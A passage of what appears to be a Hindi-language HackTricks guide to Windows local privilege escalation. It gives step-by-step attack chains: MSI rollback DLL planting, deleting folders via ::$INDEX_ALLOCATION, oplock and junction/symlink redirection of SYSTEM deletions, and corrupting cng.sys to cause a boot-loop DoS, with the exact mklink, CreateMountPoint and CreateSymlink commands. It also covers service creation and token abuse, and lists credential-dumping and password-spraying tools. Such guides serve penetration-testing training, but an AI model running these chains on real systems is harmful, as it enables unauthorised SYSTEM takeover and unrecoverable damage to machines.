- एक **type 19 custom action (`ErrorOut`)** को किसी ज्ञात point पर install को **जानबूझकर fail** करने के लिए configure किया गया है।
- इससे **rollback शुरू** हो जाता है।

- Step 13: SYSTEM आपकी DLL install करता है
- Windows Installer:
- आपकी malicious `.rbs` को पढ़ता है।
- आपकी `.rbf` DLL को target location में copy करता है।
- अब आपके पास **SYSTEM द्वारा load किए जाने वाले path में malicious DLL** है।

- Final Step: SYSTEM Code execute करें
- एक trusted **auto-elevated binary** (जैसे, `osk.exe`) चलाएँ, जो आपके hijack किए गए DLL को load करती है।
- **Boom**: आपका code **SYSTEM** के रूप में execute होता है।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP

मुख्य MSI rollback technique (पिछली वाली) इस बात पर निर्भर करती है कि आप एक **पूरा folder** (जैसे, `C:\Config.Msi`) delete कर सकते हैं। लेकिन यदि आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है, तो क्या होगा?

आप **NTFS internals** का exploit कर सकते हैं: प्रत्येक folder में एक hidden alternate data stream होती है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream** को **delete** कर देते हैं, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप इसे standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को call कर रहे हों, यह **folder को स्वयं delete कर देता है**।

### Folder Contents Delete से SYSTEM EoP तक
अगर आपका primitive आपको arbitrary files/folders delete करने की अनुमति नहीं देता, लेकिन यह **attacker-controlled folder के *contents* को delete करने की अनुमति देता है**, तो क्या होगा?

1. Step 1: एक bait folder और file setup करें
- Create करें: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने का प्रयास करता है, तो oplock **execution को pause कर देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process को trigger करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी contents को delete करने का प्रयास करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock trigger** होता है और control आपके callback को सौंप दिया जाता है।

4. Step 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को किसी अन्य स्थान पर move करें
- इससे oplock को तोड़े बिना `folder1` empty हो जाता है।
- `file1.txt` को सीधे delete न करें — ऐसा करने पर oplock समय से पहले release हो जाएगा।

- Option B: `folder1` को **junction** में convert करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को target करता है, जो folder metadata store करता है — इसे delete करने से folder delete हो जाता है।

5. Step 5: oplock को release करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने का प्रयास करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा delete कर दिया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

ऐसी **primitive** का उपयोग करें जो आपको SYSTEM/admin के रूप में **arbitrary folder create** करने देती है — भले ही **आप files write** न कर सकें या **weak permissions set** न कर सकें।

एक **folder** (file नहीं) बनाएं, जिसका नाम किसी **critical Windows driver** के नाम पर हो, जैसे:
```
C:\Windows\System32\cng.sys
```
- यह path सामान्यतः `cng.sys` kernel-mode driver से संबंधित होता है।
- यदि आप इसे **पहले से एक folder के रूप में बना देते हैं**, तो Windows boot के दौरान वास्तविक driver को load करने में विफल हो जाता है।
- इसके बाद, Windows boot के दौरान `cng.sys` को load करने का प्रयास करता है।
- इसे folder दिखाई देता है, **वास्तविक driver को resolve करने में विफल रहता है**, और **boot crash या halt हो जाता है**।
- कोई **fallback** नहीं होता, और बाहरी intervention (जैसे boot repair या disk access) के बिना **recovery** संभव नहीं होती।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** के साथ redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (SeCreateSymbolicLinkPrivilege के बिना भी)।

**Requirements**
- Target path रखने वाला config attacker के लिए writable हो (जैसे `%ProgramData%\...\.ini`)।
- `\RPC Control` के लिए mount point और OM file symlink बनाने की ability हो (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- कोई privileged operation उस path पर लिखता हो (log, export, report)।

**Example chain**
1. Config पढ़कर privileged log destination प्राप्त करें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component के log लिखने की प्रतीक्षा करें (जैसे, admin "send test SMS" trigger करता है)। अब write `C:\Windows\System32\cng.sys` में होती है।
4. Overwritten target का निरीक्षण करें (hex/PE parser) ताकि corruption की पुष्टि हो सके; reboot Windows को tampered driver path लोड करने के लिए बाध्य करता है → **boot loop DoS**। यह किसी भी protected file पर भी लागू होता है, जिसे कोई privileged service write के लिए खोलेगी।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन यदि उसकी copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो उसे पहले आज़माया जा सकता है, जिससे वह corrupt data के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से System तक**

### **नई service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **SYSTEM तक पहुंचने का path** आसान हो सकता है—बस एक नई service **create और execute** करें:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक actions तेज़ी से perform करे, क्योंकि valid service न होने पर इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने का प्रयास कर सकते हैं।\
[संबंधित registry keys और _.msi_ package को install करने के तरीके के बारे में अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से Full Token privileges तक

यदि आपके पास वे token privileges हैं (संभवतः आप इन्हें पहले से High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ **लगभग किसी भी process को open** कर सकेंगे (protected processes को छोड़कर), उस process का **token copy** कर सकेंगे और उस token के साथ एक **arbitrary process create** कर सकेंगे।\
इस technique का सामान्यतः उपयोग **सभी token privileges के साथ SYSTEM के रूप में चल रहे किसी process को select करने** के लिए किया जाता है (_हाँ, आप ऐसे SYSTEM processes पा सकते हैं जिनके पास सभी token privileges नहीं होते_ )।\
**प्रस्तावित technique को execute करने वाले code का एक** [**example यहाँ पा सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

इस technique का उपयोग meterpreter द्वारा `getsystem` में escalate करने के लिए किया जाता है। इस technique में **एक pipe create करना और फिर उस pipe पर write करने के लिए एक service create/abuse करना** शामिल है। इसके बाद, **`SeImpersonate`** privilege का उपयोग करके pipe create करने वाला **server**, pipe client (service) के **token को impersonate** कर सकेगा और SYSTEM privileges प्राप्त कर सकेगा।\
यदि आप [**name pipes के बारे में अधिक जानना चाहते हैं, तो इसे पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप [**name pipes का उपयोग करके high integrity से System तक जाने का example पढ़ना चाहते हैं, तो इसे पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **loaded** होने वाली **dll को hijack** करने में सफल हो जाते हैं, तो आप उन permissions के साथ arbitrary code execute कर सकेंगे। इसलिए Dll Hijacking इस प्रकार के privilege escalation के लिए भी उपयोगी है और, इसके अलावा, **high integrity process से इसे achieve करना काफी आसान है**, क्योंकि उसके पास dlls को load करने के लिए उपयोग किए जाने वाले folders पर **write permissions** होंगी।\
**आप** [**Dll hijacking के बारे में अधिक यहाँ जान सकते हैं**](dll-hijacking/index.html)**।**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**यहाँ जाँचें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच करें और info gather करें (**[**यहाँ जाँचें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session information extract करता है। local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से crendentials extract करता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- gathered passwords को पूरे domain में spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजता है (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करना आवश्यक है) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host की enumeration करता है (privesc tool से अधिक gather info tool) (compile करना आवश्यक है) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- बहुत से softwares से credentials extract करता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच करता है (github में executable precompiled है)। Recommended नहीं है। यह Win10 में अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच करता है (python से exe)। Recommended नहीं है। यह Win10 में अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (ठीक से काम करने के लिए इसे accesschk की आवश्यकता नहीं है, लेकिन यह इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़ता है और working exploits recommend करता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़ता है और working exploits recommend करता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको project को .NET के सही version का उपयोग करके compile करना होगा ([इसे देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। Victim host पर installed .NET version देखने के लिए आप यह कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP के जरिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Fox का पीछा: Kernel Shadows में Cat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA System में मौजूद Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Windows पर Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Windows पर Dangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: `node_modules` folders से loading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [Pwn2Own with Microslop: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को chain करना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [One I/O Ring to Rule Them All: Windows 11 पर Full Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)

{{#include ../../banners/hacktricks-training.md}}
